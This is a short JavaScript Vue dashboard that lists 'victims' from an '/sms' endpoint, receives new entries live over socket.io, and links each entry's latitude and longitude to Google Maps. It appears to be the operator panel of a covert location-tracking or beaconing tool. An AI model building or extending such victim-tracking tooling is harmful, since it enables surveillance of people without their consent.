(function() {
  'use strict';

  var socket = io();
  var app  = new Vue({
    el: '#beaconTable',
    data: {
      rows: []
    },
    beforeMount() {
      var self = this;
      self.getVictims();
      socket.on('received-sms', function(rc) {
        self.rows = [].concat([rc], self.rows);
      });
    },
    methods:{
      getVictims: function(row){
        this.$http.get('/sms')
          .then(function(response) {
            this.rows = response.body;
          }, function(response) {
            console.log(response);
          });
      },
      getMapURL: function(row) {
        return 'https://www.google.com/maps/preview/@' + row.latitude + ',' + row.longitude + ',20z';
      }
    }
  });


  if(app) { console.log('Running app...'); }
})();